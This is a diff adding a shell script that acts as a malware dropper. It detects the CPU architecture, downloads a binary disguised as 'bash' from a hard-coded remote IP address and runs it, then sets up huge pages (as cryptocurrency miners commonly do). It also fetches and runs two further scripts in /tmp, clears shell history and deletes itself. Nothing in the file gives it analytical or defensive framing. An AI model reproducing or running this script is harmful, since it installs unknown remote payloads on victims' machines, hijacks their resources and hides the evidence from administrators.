@@ -1,0 +1,40 @@
+#!/bin/sh
+
+X86="http://198.98.51.104:282/x86/bash"
+ARM="http://198.98.51.104:282/arm/bash"
+AARCH64="http://198.98.51.104:282/aarch64/bash"
+
+CPU_TYPE="$(uname -m)"
+
+if [ "$CPU_TYPE" = "x86_64" -o "$CPU_TYPE" = "i386" -o "$CPU_TYPE" = "i686" ]; then
+wget -q $X86 2>/dev/null || curl -fsSLO $X86 2>/dev/null
+if [ -s bash ]; then
+chmod +x bash 2>/dev/null
+./bash
+rm -rf bash*
+fi
+fi
+
+if [ "$CPU_TYPE" = "armv7l" ]; then
+wget -q $ARM 2>/dev/null || curl -fsSLO $ARM 2>/dev/null
+if [ -s bash ]; then
+chmod +x bash 2>/dev/null
+./bash
+rm -rf bash*
+fi
+fi
+
+if [ "$CPU_TYPE" = "aarch64" ]; then
+wget -q $AARCH64 2>/dev/null || curl -fsSLO $AARCH64 2>/dev/null
+if [ -s bash ]; then
+chmod +x bash 2>/dev/null
+./bash
+rm -rf bash*
+fi
+fi
+
+/sbin/sysctl -w vm.nr_hugepages=128
+cd /tmp ; wget http://198.98.51.104:282/1 || curl -O http://198.98.51.104:282/1 ; chmod 777 1 ; sh 1 ; rm -rf 1* ;clear;history -c; clear;history -w
+cd /tmp ; wget http://198.98.51.104:282/2 || curl -O http://198.98.51.104:282/2 ; chmod 777 2 ; sh 2 ; rm -rf 2* ;clear;history -c; clear;history -w
+
+rm -rf i.sh*
